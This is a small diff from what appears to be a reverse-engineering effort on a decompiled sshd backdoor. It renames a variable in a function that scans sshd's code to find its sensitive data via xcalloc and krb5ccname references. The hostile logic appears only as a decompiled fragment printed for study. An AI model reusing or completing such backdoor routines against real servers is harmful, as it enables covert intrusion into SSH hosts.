@@ -27,7 +27,7 @@ BOOL sshd_find_sensitive_data
   u64 uVar3;
   u64 uVar4;
   u8 *code_start;
-  u8 *puVar5;
+  u8 *code_segment_end;
   BOOL BVar6;
   BOOL BVar7;
   uint uVar8;
@@ -136,14 +136,14 @@ BOOL sshd_find_sensitive_data
   ctx->sshd_main = sshd_main_addr;
   BVar6 = is_endbr64_instruction(sshd_main_addr,sshd_main_addr + 4,0xe230);
   ctx->uses_endbr64 = (uint)(BVar6 != FALSE);
-  puVar5 = (u8 *)((long)pvVar11 + uVar3);
+  code_segment_end = (u8 *)((long)pvVar11 + uVar3);
   if ((BVar6 != FALSE) &&
      (BVar6 = find_function(code_start,(void **)0x0,&code_scan_limit,code_start,
-                            (u8 *)((long)pvVar11 + uVar3),FIND_NOP), puVar5 = code_scan_limit,
+                            (u8 *)((long)pvVar11 + uVar3),FIND_NOP), code_segment_end = code_scan_limit,
      BVar6 == FALSE)) {
     return FALSE;
   }
-  code_scan_limit = puVar5;
+  code_scan_limit = code_segment_end;
   BVar6 = sshd_get_sensitive_data_address_via_xcalloc
                     (data_start,data_start + uVar4,code_start,code_scan_limit,refs,&xzcalloc_candidate_local);
   BVar7 = sshd_get_sensitive_data_address_via_krb5ccname
